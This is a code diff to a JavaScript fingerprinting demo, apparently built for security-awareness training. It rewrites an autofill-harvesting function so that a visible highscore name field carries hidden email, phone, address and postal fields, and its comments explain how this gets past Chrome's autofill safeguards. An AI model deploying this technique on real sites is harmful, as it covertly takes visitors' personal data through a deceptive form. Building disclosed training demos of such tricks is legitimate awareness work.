@@ -8,11 +8,17 @@
 // permission prompt (Geolocation/camera/mic APIs are deliberately NOT
 // used — those show a visible browser prompt, which would defeat the
 // "nobody notices" point of the demo) — plus one deliberately more
-// invasive technique (harvestAutofill) that baits the browser's saved
-// autofill profile into leaking real name/email/phone into invisible
-// form fields. Scoped strictly to the training context described in
-// docs/57 — disclosed verbally to participants, then shown live via the
-// Grafana dashboard as the reveal.
+// invasive technique (harvestAutofill): a real, visible "name for the
+// highscore list" field (genuinely plausible game UX) sitting in the
+// same <form> as invisible email/phone/address fields. A fully invisible
+// bait form doesn't work against modern Chrome — filling any field from
+// a saved profile requires an actual user click on the autofill
+// suggestion dropdown, which JS cannot trigger — but Chrome fills every
+// matching field in a form together once the user accepts one
+// suggestion, so the hidden fields can ride along with the visible one.
+// Scoped strictly to the training context described in docs/57 —
+// disclosed verbally to participants, then shown live via the Grafana
+// dashboard as the reveal.
 (function () {
   "use strict";
 
@@ -137,65 +143,106 @@
   // profile, it fills these fields on its own — no typing, no visible
   // form. This is the one technique here that can produce real personal
   // data (name/email/phone) rather than just device characteristics.
+  // A fully invisible bait form (the original approach) doesn't work
+  // against modern Chrome: filling a field from a saved profile requires
+  // an actual user click on the autofill suggestion dropdown — no CSS
+  // trick or synthetic focus() bypasses that, it's a deliberate anti-abuse
+  // boundary, not a visibility check.
+  //
+  // This is the realistic version instead: one REAL, visible field
+  // ("Name für die Bestenliste", a normal highscore prompt — genuinely
+  // plausible game UX) that the visitor actually interacts with. The
+  // email/tel/address/postal fields sit in the *same* <form>, invisible,
+  // but Chrome's profile-autofill fills every matching field in a form
+  // together once the user picks one suggestion — so accepting the
+  // autofill suggestion for "Name" can pull the hidden fields along with
+  // it. This mirrors how real deceptive forms work (a plausible-looking
+  // single field hiding a bigger form), rather than a purely invisible
+  // attack — still fully disclosed afterward per docs/57.
   function harvestAutofill(callback) {
     try {
-      var form = document.createElement("form");
-      // Chrome (and other modern browsers) specifically hardened against
-      // the old "left:-9999px" trick — an offscreen field with zero
-      // effective viewport overlap is treated as not-visible and skipped
-      // by the autofill heuristic. Kept in-viewport instead: zero opacity
-      // + non-zero size + stacked behind the page content (negative
-      // z-index, pointer-events:none so it can't intercept real clicks).
-      // A submit button is included (never clicked) purely because
-      // Chrome's form classifier weighs "looks like a real form" more
-      // heavily when one is present. None of this is guaranteed to work
-      // against a given browser/version — autofill anti-abuse heuristics
-      // change over time and are not publicly documented in detail; this
-      // is a best-effort demo, not a guaranteed exploit.
-      form.setAttribute(
+      var wrap = document.createElement("div");
+      wrap.setAttribute(
         "style",
-        "position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; z-index:-1; pointer-events:none;"
+        "position:fixed; bottom:16px; right:16px; z-index:9999; background:#000; " +
+          "border:2px solid #ffcc00; border-radius:4px; padding:10px 12px; " +
+          "font-family:'Press Start 2P', monospace; font-size:11px; color:#ffcc00; " +
+          "box-shadow:0 0 12px rgba(255,204,0,0.5); max-width:240px;"
       );
-      form.setAttribute("autocomplete", "on");
+      wrap.innerHTML = '<div style="margin-bottom:8px; line-height:1.4;">🏆 Für die Bestenliste:<br/>Dein Name?</div>';
 
-      var fields = [
-        { name: "name", autocomplete: "name", type: "text" },
+      var form = document.createElement("form");
+      form.setAttribute("autocomplete", "on");
+      form.setAttribute("style", "display:flex; gap:4px;");
+
+      var nameInput = document.createElement("input");
+      nameInput.type = "text";
+      nameInput.name = "name";
+      nameInput.placeholder = "Name";
+      nameInput.setAttribute("autocomplete", "name");
+      nameInput.setAttribute(
+        "style",
+        "width:110px; font-family:inherit; font-size:11px; padding:4px; " +
+          "background:#111; color:#ffcc00; border:1px solid #ffcc00;"
+      );
+
+      var submitBtn = document.createElement("button");
+      submitBtn.type = "submit";
+      submitBtn.textContent = "OK";
+      submitBtn.setAttribute(
+        "style",
+        "font-family:inherit; font-size:11px; padding:4px 8px; " +
+          "background:#ffcc00; color:#000; border:none; cursor:pointer;"
+      );
+
+      // Same form as the visible name field, so a Chrome profile-autofill
+      // selection on "name" can fill these together — invisible, but not
+      // display:none/visibility:hidden (those are excluded from autofill
+      // entirely; zero-size + opacity:0 is not).
+      var hiddenFields = [
         { name: "email", autocomplete: "email", type: "email" },
         { name: "tel", autocomplete: "tel", type: "tel" },
         { name: "address", autocomplete: "street-address", type: "text" },
         { name: "postal", autocomplete: "postal-code", type: "text" },
       ];
-      var inputs = {};
-      fields.forEach(function (f) {
+      var inputs = { name: nameInput };
+      hiddenFields.forEach(function (f) {
         var input = document.createElement("input");
         input.type = f.type;
         input.name = f.name;
         input.setAttribute("autocomplete", f.autocomplete);
-        form.appendChild(input);
+        input.setAttribute("style", "position:absolute; width:1px; height:1px; opacity:0; pointer-events:none;");
         inputs[f.name] = input;
+        form.appendChild(input);
       });
-      var submit = document.createElement("input");
-      submit.type = "submit";
-      submit.tabIndex = -1;
-      form.appendChild(submit);
-      document.body.appendChild(form);
 
-      // Best-effort nudge: some browsers only actually populate .value
-      // once a field in the form has received focus, even if the
-      // autofill preview was already computed on page load.
-      try {
-        inputs.name.focus();
-        inputs.name.blur();
-      } catch (e) {}
+      form.appendChild(nameInput);
+      form.appendChild(submitBtn);
+      wrap.appendChild(form);
+      document.body.appendChild(wrap);
 
-      setTimeout(function () {
+      var finished = false;
+      var finish = function () {
+        if (finished) return;
+        finished = true;
         var harvested = {};
         Object.keys(inputs).forEach(function (key) {
           if (inputs[key].value) harvested[key] = inputs[key].value;
         });
-        document.body.removeChild(form);
+        if (wrap.parentNode) document.body.removeChild(wrap);
         callback(Object.keys(harvested).length ? harvested : null);
-      }, 2000);
+      };
+
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
+        finish();
+      });
+
+      // Give the visitor a real chance to notice the prompt, interact
+      // with the name field (which is what actually triggers Chrome's
+      // autofill dropdown), and either submit or ignore it before we
+      // collect+remove it either way.
+      setTimeout(finish, 15000);
     } catch (e) {
       callback(null);
     }
